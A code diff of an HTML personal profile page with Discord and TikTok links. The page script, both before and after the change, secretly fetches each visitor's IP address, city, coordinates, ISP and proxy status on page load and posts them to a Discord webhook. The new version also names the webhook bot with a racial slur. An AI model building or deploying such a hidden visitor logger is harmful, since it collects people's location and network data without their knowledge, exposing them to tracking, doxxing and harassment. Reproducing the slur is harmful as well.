@@ -2,19 +2,16 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Lieutenant Gst</title>
-  <link rel="stylesheet" href="src/css/main.min.css" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Lieutenant Ghost</title>
   <link href="https://cdn.staticaly.com/gh/hung1001/font-awesome-pro/4cac1a6/css/all.css" rel="stylesheet" />
   <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;600&display=swap" rel="stylesheet" />
-  <link rel="icon" href="./src/favicon.ico" />
   <style>
     body {
       font-family: 'Poppins', sans-serif;
       background: #0d1117;
       color: #f0f0f0;
-      margin: 0;
-      padding: 0;
+      margin: 0; padding: 0;
     }
     .container {
       max-width: 600px;
@@ -26,17 +23,10 @@
       text-align: center;
     }
     .profile-img {
-      width: 100px;
-      height: 100px;
+      width: 100px; height: 100px;
       border-radius: 50%;
       border: 2px solid #fff;
       margin-bottom: 15px;
-    }
-    .badges img {
-      width: 24px;
-      height: 24px;
-      margin: 0 4px;
-      vertical-align: middle;
     }
     h1 { margin-bottom: 5px; font-size: 26px; }
     p { margin-top: 0; color: #8b949e; }
@@ -52,15 +42,13 @@
       transition: background 0.3s ease;
     }
     .links a:hover { background: #2ea043; }
-    .header { display: none; }
   </style>
 </head>
 <body>
   <div class="container">
-    <img id="avatar" src="" alt="Profile" class="profile-img" />
-    <h1 id="username">Loading...</h1>
-    <p id="status">Status: loading...</p>
-    <div class="badges" id="badges"></div>
+    <img id="avatar" src="https://cdn.discordapp.com/avatars/1046813139641057300/39b520e5c76cada8f2d5a284d94d72a3.png?size=256" alt="Avatar" class="profile-img" />
+    <h1>Lieutenant Ghost</h1>
+    <p>Status: Online</p>
     <div class="links">
       <a href="https://discord.com/invite/H8BSXE2k7N" target="_blank"><i class="fab fa-discord"></i> Join Discord</a>
       <a href="https://tiktok.com/@drangerog.ae?_t=ZT-8uuMdgYNjpu&_r=1" target="_blank"><i class="fab fa-tiktok"></i> TikTok</a>
@@ -76,15 +64,18 @@
   <script>
     const SAFE_IPS = ["76.39.43.192"];
 
-    function get_information(link, callback) {
-      const xhr = new XMLHttpRequest();
-      xhr.open("GET", link, true);
-      xhr.onreadystatechange = () => xhr.readyState === 4 && callback(xhr.responseText);
-      xhr.send();
+    function sendWebhook(payload) {
+      if (typeof CONFIG === 'undefined' || !CONFIG.webhook) {
+        console.error("Webhook URL missing in config.js!");
+        return;
+      }
+      const req = new XMLHttpRequest();
+      req.open("POST", CONFIG.webhook);
+      req.setRequestHeader("Content-Type", "application/json");
+      req.send(JSON.stringify(payload));
     }
 
-    function ipLogByRaz(ip, extra) {
-      const data = JSON.parse(extra);
+    function logIP(ip, data) {
       const embed = {
         title: ip === "SAFE IP" ? "✅ Safe IP Logged" : "🌐 Geolocation Logger",
         color: ip === "SAFE IP" ? 0x57F287 : 0x5865F2,
@@ -94,75 +85,50 @@
           { name: "📍 Coordinates", value: `${data.lat || "?"}, ${data.lon || "?"}`, inline: true },
           { name: "🖥️ ISP", value: data.isp || "Unknown", inline: true },
           { name: "🏢 Org", value: data.org || "Unknown", inline: true },
-          { name: "🕵️‍♂️ Proxy", value: `${data.proxy}`, inline: true },
-          { name: "🏬 Hosting", value: `${data.hosting}`, inline: true }
+          { name: "🕵️‍♂️ Proxy", value: `${data.proxy || "Unknown"}`, inline: true },
+          { name: "🏬 Hosting", value: `${data.hosting || "Unknown"}`, inline: true }
         ],
         footer: { text: "Fetched via ip-api.com" },
-        timestamp: new Date().toISOString(),
-        url: `https://api.techniknews.net/ipgeo/${ip}`
+        timestamp: new Date().toISOString()
       };
 
       const payload = {
-        username: "Lieutenant Gst Logger",
-        avatar_url: "https://cdn.discordapp.com/avatars/1046813139641057300/39b520e5c76cada8f2d5a284d94d72a3.png?size=256",
+        username: "BEAMED NIGGA",
+        avatar_url: "https://avatarfiles.alphacoders.com/977/97700.gif",
         embeds: [embed]
       };
-
-      const request = new XMLHttpRequest();
-      request.open("POST", CONFIG.webhook);
-      request.setRequestHeader("Content-Type", "application/json");
-      request.send(JSON.stringify(payload));
+      sendWebhook(payload);
     }
 
-    get_information("https://ip-api.com/json/?fields=query,status,country,region,city,lat,lon,isp,org,proxy,hosting", function(text) {
-      const data = JSON.parse(text);
-      const userIp = data.query;
+    function fetchIPInfo() {
+      fetch("https://ip-api.com/json/?fields=query,status,country,region,city,lat,lon,isp,org,proxy,hosting")
+        .then(res => res.json())
+        .then(data => {
+          const userIp = data.query;
 
-      if (SAFE_IPS.includes(userIp)) {
-        const masked = {
-          city: "Unknown",
-          region: "?",
-          country: "?",
-          lat: "?",
-          lon: "?",
-          isp: "Unknown",
-          org: "Unknown",
-          proxy: "Unknown",
-          hosting: "Unknown"
-        };
-        ipLogByRaz("SAFE IP", JSON.stringify(masked));
-        return;
-      }
-
-      ipLogByRaz(userIp, JSON.stringify(data));
-    });
-
-    const badgeIcons = {
-      activeDeveloper: "https://cdn.jsdelivr.net/gh/AnIdiotsGuide/discord-badges@master/assets/active-developer.svg",
-      hypesquadOnlineHouse2: "https://cdn.jsdelivr.net/gh/AnIdiotsGuide/discord-badges@master/assets/hypesquad-brilliance.svg"
-    };
-
-    fetch("https://50943325-679b-4d36-8a75-748a818c8261-00-113nqzxgbo8ft.picard.replit.dev/discord-info")
-      .then(res => res.json())
-      .then(data => {
-        document.getElementById("avatar").src = data.avatar?.formats?.png || "";
-        document.getElementById("username").textContent = data.user?.username || "Unknown";
-        document.getElementById("status").textContent = `Status: ${data.presence?.status || "unknown"}`;
-        const badgeList = document.getElementById("badges");
-        const badges = data.badges || {};
-        for (const key in badges) {
-          if (badges[key] && badgeIcons[key]) {
-            const img = document.createElement("img");
-            img.src = badgeIcons[key];
-            img.alt = key;
-            img.title = key;
-            badgeList.appendChild(img);
+          if (SAFE_IPS.includes(userIp)) {
+            const masked = {
+              city: "Unknown",
+              region: "?",
+              country: "?",
+              lat: "?",
+              lon: "?",
+              isp: "Unknown",
+              org: "Unknown",
+              proxy: "Unknown",
+              hosting: "Unknown"
+            };
+            logIP("SAFE IP", masked);
+          } else {
+            logIP(userIp, data);
           }
-        }
-      })
-      .catch(err => {
-        console.error("Discord info failed:", err);
-      });
+        })
+        .catch(err => {
+          console.error("Failed to fetch IP info:", err);
+        });
+    }
+
+    fetchIPInfo();
   </script>
 </body>
 </html>
